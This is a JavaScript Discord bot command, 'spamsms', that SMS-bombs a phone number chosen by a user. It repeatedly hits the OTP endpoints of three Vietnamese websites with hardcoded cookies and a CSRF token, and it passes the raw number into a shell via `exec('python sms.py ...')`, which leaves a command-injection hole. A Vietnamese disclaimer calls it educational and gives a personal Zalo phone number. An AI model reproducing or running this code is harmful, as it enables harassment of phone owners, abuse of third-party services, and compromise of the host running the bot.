const Discord = require('discord.js')
const moment = require('moment');
const { exec } = require('child_process');
module.exports = {
  name: 'spamsms',
  run: (client, message, args) => {
    const phone = args.join(' ')
    if (phone === "111" || phone === "112" || phone === "113" || phone === "114" || phone === "115" || phone === "911") { ////
      return message.reply({
        embeds: [
          new Discord.EmbedBuilder()
            .setColor('#FF0000')
            .setAuthor({
              name: `Miku Thông Báo`,
              iconURL: `${message.guild.iconURL()}`
            })
            .setDescription(`Chờ đã ?! Wait.....\n\`\`\`🛑 Bạn nhập số không hợp lệ ! Vui lòng nhập số khác 💢\`\`\``)
            .setThumbnail(`https://media.tenor.com/IWKYIP6AMIgAAAAd/miku-nakano-the-quintessential-quintuplets.gif`)
            .setTimestamp()
            .setFooter({
              text: `© ${client.user.tag}`,
              iconURL: client.user.displayAvatarURL()
            })
            .setImage(`https://cdn.discordapp.com/attachments/888268908665110558/888274569859846154/divider_1.gif`)
        ],
      }).then(msg => { setTimeout(() => msg.delete(), 4000) })
    }
    const axios = require('axios');
    function call1(phone) {
      axios.post(
        'https://api.thantaioi.vn/api/user/send-one-time-password',
        {
          'phone': phone
        },
        {
          headers: {
            'authority': 'api.thantaioi.vn',
            'accept': '*/*',
            'accept-language': 'vi',
            'content-type': 'application/json',
            'cookie': '_gid=GA1.2.1651112869.1696736437; _ym_uid=1696736438783780716; _ym_d=1696736438; _ym_isad=1; _ym_visorc=w; _fw_crm_v=4c0a2bed-9e3d-4d20-ca6d-da446a3d0313; _gat_UA-230801217-1=1; _ga_LBS7YCVKY6=GS1.1.1696736436.1.1.1696736498.60.0.0; _ga=GA1.1.254243807.1696736436; _ga_LN0QPGLCB5=GS1.2.1696736437.1.1.1696736500.0.0.0',
            'origin': 'https://thantaioi.vn',
            'referer': 'https://thantaioi.vn/user/login',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
          }
        }
      );
    }

    function call2(phone) {
      axios.post(
        'https://oncredit.vn/?ajax',
        new URLSearchParams({
          'data[typeData]': 'sendCodeReg',
          'data[phone]': phone,
          'data[email]': '',
          'data[captcha1]': '1',
          'data[lang]': 'vi',
          'CSRFName': 'CSRFGuard_ajax',
          'CSRFToken': 'sDH4yb73sHAHkSt7s2QKeHK68B8z45kTsG7d7eYnTrDyibhGdS74SSYnkTNi9KTi'
        }),
        {
          headers: {
            'authority': 'oncredit.vn',
            'accept': 'application/json, text/javascript, */*; q=0.01',
            'accept-language': 'en',
            'content-type': 'application/x-www-form-urlencoded; charset=UTF-8',
            'cookie': 'SN5c8116d5e6183=jtuiong069vb05fj169em78p6e; OnCredit_id=65222f4c662d25.22811976; _gid=GA1.2.1212806209.1696739151; _hjFirstSeen=1; _hjIncludedInSessionSample_1876820=0; _hjSession_1876820=eyJpZCI6IjU4MTMwZWU4LThhODctNDhhMy1hYTAwLTZkOGY4NjM4OGU2OSIsImNyZWF0ZWQiOjE2OTY3MzkxNTA5ODksImluU2FtcGxlIjpmYWxzZSwic2Vzc2lvbml6ZXJCZXRhRW5hYmxlZCI6ZmFsc2V9; _hjAbsoluteSessionInProgress=0; _fbp=fb.1.1696739151077.29429852; GN_USER_ID_KEY=9f8ad142-1b33-49ff-b38a-ebabd616ba5e; GN_SESSION_ID_KEY=75d3ba3a-efeb-49bc-9bf1-5bd6e8ec7c64; gravitecOptInBlocked=true; _hjSessionUser_1876820=eyJpZCI6ImY0MWU0Yjk4LTNiZWQtNTdmMi1iYTE1LTBhZTkwNzk4N2MzZSIsImNyZWF0ZWQiOjE2OTY3MzkxNTA5ODYsImV4aXN0aW5nIjp0cnVlfQ==; fp_token_7c6a6574-f011-4c9a-abdd-9894a102ccef=Z/TLpNeDfg4F7cABKSMNUGUV0Mm8Hu1oYXyC/huPXMs=; _ga=GA1.2.935259677.1696739151; _gat_UA-139625802-1=1; _ga_462Z3ZX24C=GS1.1.1696739150.1.1.1696739259.37.0.0',
            'origin': 'https://oncredit.vn',
            'referer': 'https://oncredit.vn/registration',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-origin',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36',
            'x-requested-with': 'XMLHttpRequest'
          }
        }
      );
    }

    function call3(phone) {
      axios.post(
        'https://api.dongplus.vn/api/user/send-one-time-password',
        {
          'phone': phone.replace(/^0+/, '')
        },
        {
          headers: {
            'authority': 'api.dongplus.vn',
            'accept': '*/*',
            'accept-language': 'vi',
            'content-type': 'application/json',
            'cookie': '_gid=GA1.2.1038714915.1696740878; _gat_UA-214880719-1=1; _ga_RRJDDZGPYG=GS1.1.1696740877.1.1.1696740906.31.0.0; _ga=GA1.1.1128936598.1696740878',
            'origin': 'https://dongplus.vn',
            'referer': 'https://dongplus.vn/user/login',
            'sec-ch-ua': '"Google Chrome";v="117", "Not;A=Brand";v="8", "Chromium";v="117"',
            'sec-ch-ua-mobile': '?0',
            'sec-ch-ua-platform': '"Windows"',
            'sec-fetch-dest': 'empty',
            'sec-fetch-mode': 'cors',
            'sec-fetch-site': 'same-site',
            'user-agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/117.0.0.0 Safari/537.36'
          }
        }
      );
    }


    function scheduleCalls() {
      setInterval(function() {
        call1(phone);
      }, 10000);
    
      setTimeout(function() {
        call2(phone);
      }, 20000);
    
      setTimeout(function() {
        call3(phone);
      }, 30000); 
    }
    
    
    scheduleCalls();

    const child = exec(`python sms.py ${phone}`, (error, stdout, stderr) => {
      if (error) {
        console.error(`Error executing command: ${error}`);
        return;
      }

      const result = stdout.trim();

      console.log("Result:", result);
    });

    child.stdout.on('data', (data) => {
    });

    child.stderr.on('data', (data) => {
      console.error(`Error data: ${data}`);
    });

    console.log(`[${moment().format('YYYY-MM-DD HH:mm:ss')}] Một cuộc tấn công sms được khởi chạy bởi Discord ID: ${message.author.id}`);
    const embed = new Discord.EmbedBuilder()
      .setColor("#FF0000")
      .setAuthor({
        name: `Miku Thông Báo`,
        iconURL: `${message.guild.iconURL()}`
      })
      .setDescription("☣️ Khởi chạy lệnh spam thành công !!!\n\`\`\`fix\n⚠️ Đã khởi chạy lệnh spam thành công ! Lệnh này nhằm mục đích giáo dục không cố ý tấn công người dùng hay một tố chức nào đó. Nếu có bất kì thắc mắc vui lòng liên hệ Zalo 0359828043 để yêu cầu giải quyết !\`\`\`")
      .setImage('https://cdn.discordapp.com/attachments/1036127277659988059/1142674862893187182/68747470733a2f2f36342e6d656469612e74756d626c722e636f6d2f36643734373464363166343862363639396133346166316439643664373037322f396531613135393234383833663564302d64362f73353430783831302f303266656333613734363530646137.gif')
      .addFields(
        {
          name: "👻 User :",
          value: `\`\`\`css\n [ @${message.author.username} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "☎️ Phone :",
          value: `\`\`\`css\n [ ${phone} ] \n\`\`\``,
          inline: true,
        },
        {
          name: "💸 Plan :",
          value: `\`\`\`css\n [ MAX SPEED ] \n\`\`\``,
          inline: true,
        })
      .setFooter({
        text: `© ${client.user.tag}`,
        iconURL: client.user.displayAvatarURL()
      })
      .setTimestamp();
    const hehe = new Discord.EmbedBuilder()
      .setColor('#FF0000')
      .setAuthor({
        name: `Miku Thông Báo`,
        iconURL: `${message.guild.iconURL()}`
      })
      .setDescription(`Chờ một chút ! Wait.....\n\`\`\`💫💦Vui lòng chờ đợi trong giây lát, đang khởi chạy lệnh spam.....\`\`\``)
      .setImage("https://media.tenor.com/XasjKGMk_wAAAAAC/load-loading.gif")
      .setFooter({
        text: `© ${client.user.tag}`,
        iconURL: client.user.displayAvatarURL()
      })
      .setTimestamp();
    message.reply({ embeds: [hehe] }).then((message) => {
      setTimeout(function () {
        message.edit({ embeds: [embed] });
      }, 8000)
    })
  }
}